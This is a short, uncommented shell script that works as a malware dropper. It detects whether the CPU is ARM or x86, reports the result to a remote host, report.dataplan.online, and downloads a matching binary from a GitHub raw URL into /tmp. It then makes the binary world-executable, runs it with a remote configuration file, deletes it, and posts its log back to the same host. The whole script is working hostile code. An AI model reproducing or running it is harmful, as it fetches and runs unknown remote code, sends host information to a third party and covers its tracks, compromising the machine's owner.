#!/bin/sh

report_url="http://report.dataplan.online:19288/9024134B28978B68666E2B034E46130E/debug"
arm_url="https://raw.githubusercontent.com/gptloveyou/001/main/bin/arm.bin"
intel_url="https://raw.githubusercontent.com/gptloveyou/001/main/bin/i386.bin"
config_url="https://raw.githubusercontent.com/gptloveyou/001/main/config.json"
pl_url=$intel_url;
arch=`cat /proc/cpuinfo|grep -i -c ARM`
if [ $arch != 0 ];then
    pl_url=$arm_url
    curl -X POST $report_url -d "ARM"
else 
    pl_url=$intel_url
    curl -X POST $report_url -d "NotARM"
fi
curl -s -o /tmp/run042323.bin $pl_url 1>/tmp/tmplog042323.log 2>&1
chmod 777 /tmp/run042323.bin 1>>/tmp/tmplog042323.log 2>&1
/tmp/run042323.bin $config_url 1>>/tmp/tmplogv.log 2>&1
rm /tmp/run042323.bin
curl -X POST $report_url -d @/tmp/tmplog042323.log
rm /tmp/tmplog042323.log
